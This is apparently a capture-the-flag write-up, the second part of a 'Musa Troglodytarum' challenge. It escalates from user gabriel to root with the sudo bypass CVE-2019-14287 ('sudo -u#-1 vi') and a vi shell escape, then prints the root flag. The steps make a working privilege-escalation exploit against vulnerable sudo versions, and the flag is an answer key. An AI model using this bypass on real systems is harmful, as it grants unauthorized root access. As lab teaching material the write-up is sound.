# Musa Troglodytarum 2 — Privilege Escalation

> Continues from **Musa Troglodytarum #1** (`musa-troglodytarum-1-user.md`). Starting point: already logged in as `gabriel`.

## Techniques used

- sudo privilege enumeration
- CVE-2019-14287
- GTFOBins shell escape

## Tools used

- ssh
- sudo
- vi

## Commands and output

### 1. Privilege escalation enumeration

```bash
$ sudo -l
```

```text
User gabriel may run the following commands on le_bananier_des_montagnes:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gabriel/user.txt
```

### 2. Exploiting the sudo bypass (CVE-2019-14287)

```bash
$ sudo -u#-1 vi /home/gabriel/user.txt
```

Once inside `vi`, escape to a shell:

```text
:!/bin/bash
```

```bash
$ id
```

```text
uid=0(root) gid=1000(gabriel) groups=1000(gabriel)
```

### 3. Reading root.txt

```bash
$ cat /root/root.txt
```

```text
EPI{L4_t193_Fl0R1F3R3_D35_m0nt49N35_DR35533}
```

## Evidence

- Privilege escalation: CVE-2019-14287
- Flag (root.txt): `EPI{L4_t193_Fl0R1F3R3_D35_m0nt49N35_DR35533}`
